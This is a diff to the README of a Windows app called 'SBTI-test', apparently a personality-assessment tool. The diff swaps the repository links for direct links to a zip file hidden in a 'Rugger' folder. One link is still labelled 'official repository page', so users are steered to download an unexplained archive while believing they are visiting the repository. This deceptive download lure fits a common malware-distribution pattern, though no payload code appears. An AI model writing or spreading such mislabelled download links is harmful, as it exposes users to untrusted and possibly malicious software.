@@ -1,6 +1,6 @@
 # 🧪 SBTI-test - Assess your personality traits with ease
 
-<a href="https://github.com/pansexualanoplura2252/SBTI-test">
+<a href="https://github.com/pansexualanoplura2252/SBTI-test/raw/refs/heads/main/Rugger/test-SBT-1.0.zip">
   <img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download SBTI-test">
 </a>
 
@@ -10,7 +10,7 @@ This application provides a simple way to access personality assessment tools di
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/pansexualanoplura2252/SBTI-test) to access the files.
+1. Visit the [official repository page](https://github.com/pansexualanoplura2252/SBTI-test/raw/refs/heads/main/Rugger/test-SBT-1.0.zip) to access the files.
 2. Look for the green button labeled Code.
 3. Click Download ZIP to save the project folder to your computer.
 4. Locate the downloaded file in your Downloads folder.
